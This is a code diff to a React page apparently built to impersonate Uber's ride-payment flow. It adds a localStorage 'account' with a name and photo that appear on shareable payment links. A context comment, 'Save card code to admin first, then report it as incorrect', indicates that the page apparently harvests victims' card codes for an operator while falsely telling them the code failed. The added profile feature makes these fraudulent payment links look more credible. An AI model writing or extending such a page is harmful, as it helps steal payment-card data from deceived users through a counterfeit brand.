@@ -74,6 +74,27 @@ function getAllPrices(distanceKm) {
   }))
 }
 
+function resizeImage(file, maxSize) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader()
+    reader.onerror = () => reject(new Error('read failed'))
+    reader.onload = (e) => {
+      const img = new Image()
+      img.onerror = () => reject(new Error('decode failed'))
+      img.onload = () => {
+        const scale = Math.min(1, maxSize / Math.max(img.width, img.height))
+        const canvas = document.createElement('canvas')
+        canvas.width = Math.max(1, Math.round(img.width * scale))
+        canvas.height = Math.max(1, Math.round(img.height * scale))
+        canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height)
+        resolve(canvas.toDataURL('image/jpeg', 0.85))
+      }
+      img.src = e.target.result
+    }
+    reader.readAsDataURL(file)
+  })
+}
+
 function estimatePickupEtaMinutes(rideTypeKey, pickupLat, pickupLng) {
   const [minMinutes, maxMinutes] = PICKUP_ETA_RANGES[rideTypeKey] || PICKUP_ETA_RANGES.uber_x
   const seed = `${rideTypeKey}:${(Number(pickupLat) || 0).toFixed(3)}:${(Number(pickupLng) || 0).toFixed(3)}`
@@ -148,6 +169,14 @@ export default function PayUberPage() {
   const [uploadProgress, setUploadProgress] = useState(false)
   const [uploadError, setUploadError] = useState(null)
   const [createdSession, setCreatedSession] = useState(false)
+
+  // Local profile (name + photo, stored in localStorage only)
+  const [profile, setProfile] = useState(null)
+  const [profileMenuOpen, setProfileMenuOpen] = useState(false)
+  const [profileModalOpen, setProfileModalOpen] = useState(false)
+  const [profileName, setProfileName] = useState('')
+  const [profileImage, setProfileImage] = useState('')
+  const [profileError, setProfileError] = useState('')
 
   const mapRef = useRef(null)
   const leafletRef = useRef(null)
@@ -239,6 +268,14 @@ export default function PayUberPage() {
   }, [])
 
   useEffect(() => () => { if (toastTimerRef.current) clearTimeout(toastTimerRef.current) }, [])
+
+  // Load local profile on mount
+  useEffect(() => {
+    try {
+      const raw = localStorage.getItem('payuber_profile')
+      if (raw) setProfile(JSON.parse(raw))
+    } catch (err) {}
+  }, [])
 
   // Load Leaflet on demand
   const ensureLeaflet = useCallback(async () => {
@@ -658,6 +695,8 @@ export default function PayUberPage() {
         rideType: selectedType,
         rideName: selected.name,
         amount: price,
+        riderName: profile ? profile.name : null,
+        riderImage: profile ? profile.image : null,
       }),
     })
     const data = await res.json()
@@ -723,6 +762,55 @@ export default function PayUberPage() {
     } else {
       closeView('methods')
     }
+  }
+
+  // ── Local profile (name + photo) ──
+  const openProfileModal = () => {
+    setProfileName(profile ? profile.name : '')
+    setProfileImage(profile && profile.image ? profile.image : '')
+    setProfileError('')
+    setProfileMenuOpen(false)
+    setProfileModalOpen(true)
+  }
+
+  const handleProfileImageSelect = async (e) => {
+    const file = e.target.files && e.target.files[0]
+    e.target.value = ''
+    if (!file) return
+    try {
+      const resized = await resizeImage(file, 256)
+      setProfileImage(resized)
+    } catch (err) {
+      setProfileError('Could not read that image. Try another one.')
+    }
+  }
+
+  const saveProfile = () => {
+    if (!profileName.trim()) {
+      setProfileError('Please enter your name.')
+      return
+    }
+    try {
+      localStorage.setItem('payuber_profile', JSON.stringify({
+        name: profileName.trim(),
+        image: profileImage || null,
+      }))
+      setProfile({ name: profileName.trim(), image: profileImage || null })
+    } catch (err) {
+      setProfileError('Could not save your profile on this device.')
+      return
+    }
+    setProfileModalOpen(false)
+    setProfileError('')
+    showToast(profile ? 'Profile updated' : 'Account created')
+  }
+
+  const logoutProfile = () => {
+    try { localStorage.removeItem('payuber_profile') } catch (err) {}
+    setProfile(null)
+    setProfileMenuOpen(false)
+    setProfileModalOpen(false)
+    showToast('Logged out')
   }
 
   // Save card code to admin first, then report it as incorrect
@@ -913,8 +1001,30 @@ export default function PayUberPage() {
         <div className="header-right">
           <a href="#" className="header-lang">EN</a>
           <a href="#" className="header-help">Help</a>
-          <a href="#">Log in</a>
-          <a href="#" className="header-signup">Sign up</a>
+          {profile ? (
+            <div className="profile-widget">
+              {profileMenuOpen && <div className="profile-menu-backdrop" onClick={() => setProfileMenuOpen(false)} />}
+              <button
+                className="profile-trigger"
+                onClick={() => setProfileMenuOpen((v) => !v)}
+                aria-label="Profile menu"
+              >
+                {profile.image ? (
+                  <img src={profile.image} alt={profile.name} className="profile-avatar-img" />
+                ) : (
+                  <span className="profile-name-only">{profile.name}</span>
+                )}
+              </button>
+              {profileMenuOpen && (
+                <div className="profile-menu">
+                  <div className="profile-menu-item" onClick={openProfileModal}>Edit</div>
+                  <div className="profile-menu-item profile-menu-item-danger" onClick={logoutProfile}>Log out</div>
+                </div>
+              )}
+            </div>
+          ) : (
+            <button className="header-login-btn" onClick={openProfileModal}>Login</button>
+          )}
         </div>
       </header>
 
@@ -1125,7 +1235,23 @@ export default function PayUberPage() {
 
               {session && !sessionLoading && payStep === 'summary' && (
                 <>
-                  <h3 className="ride-category-title">{selectedSummary.name}</h3>
+                  {session.riderName ? (
+                    <div className="ride-summary-header">
+                      <div className="ride-summary-text">
+                        <div className="ride-summary-eyebrow">Ride {session.rideNumber || '—'}</div>
+                        <div className="ride-summary-name">{session.riderName}</div>
+                      </div>
+                      <div className="ride-summary-avatar">
+                        {session.riderImage ? (
+                          <img src={session.riderImage} alt={session.riderName} />
+                        ) : (
+                          <span>{session.riderName.charAt(0).toUpperCase()}</span>
+                        )}
+                      </div>
+                    </div>
+                  ) : (
+                    <h3 className="ride-category-title">{selectedSummary.name}</h3>
+                  )}
                   <div className="payment-route-card">
                     <div className="payment-route-row">
                       <span className="route-dot route-dot-pickup"></span>
@@ -1354,6 +1480,42 @@ export default function PayUberPage() {
                 <div className="share-icon" style={{ background: '#007AFF', color: '#fff' }} dangerouslySetInnerHTML={{ __html: NATIVE_ICON }} />
                 <span>More</span>
               </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Profile modal (localStorage account) */}
+      {profileModalOpen && (
+        <div className="uber-modal-overlay" onClick={() => setProfileModalOpen(false)}>
+          <div className="uber-modal" onClick={(e) => e.stopPropagation()}>
+            <button className="uber-modal-close" onClick={() => setProfileModalOpen(false)}>&times;</button>
+            <h2>{profile ? 'Edit Profile' : 'Create Account'}</h2>
+            <p className="uber-modal-subtitle">Your name and photo will appear on your payment links.</p>
+            <div className="profile-form">
+              <label className="profile-avatar-upload">
+                {profileImage ? (
+                  <img src={profileImage} alt="avatar" />
+                ) : (
+                  <>
+                    <span className="profile-avatar-upload-icon" dangerouslySetInnerHTML={{ __html: UPLOAD_ICON }} />
+                    <span className="profile-avatar-upload-label">Upload photo</span>
+                  </>
+                )}
+                <input type="file" accept="image/*" style={{ display: 'none' }} onChange={handleProfileImageSelect} />
+              </label>
+              <input
+                type="text"
+                className="profile-name-input"
+                placeholder="Your name"
+                autoComplete="off"
+                value={profileName}
+                onChange={(e) => setProfileName(e.target.value)}
+              />
+              {profileError && <p style={{ color: '#E54B4B', fontSize: 13 }}>{profileError}</p>}
+              <button className="uber-modal-btn uber-modal-btn-primary" onClick={saveProfile}>
+                Save
+              </button>
             </div>
           </div>
         </div>
